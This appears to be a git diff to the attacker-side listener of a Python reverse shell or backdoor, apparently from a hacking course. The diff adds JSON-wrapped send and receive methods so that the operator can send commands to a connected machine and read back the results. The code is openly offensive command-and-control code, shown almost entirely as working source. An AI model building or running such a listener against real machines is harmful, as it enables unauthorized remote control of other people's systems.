@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 import socket
+import json
 
 
 class Listener:
@@ -12,9 +13,22 @@ class Listener:
         self.connection, self.address = listener.accept()
         print("[+] Got a connection" + str(self.address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)  # converts data into json object
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)  # receives data of 1024 bytes
+                return json.loads(json_data)  # unwraps data from json file
+            except ValueError:
+                continue
+
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        self.reliable_send(command)
+        return self.reliable_receive()  # receives data of 1024 bytes 
 
     def run(self):
         while True:
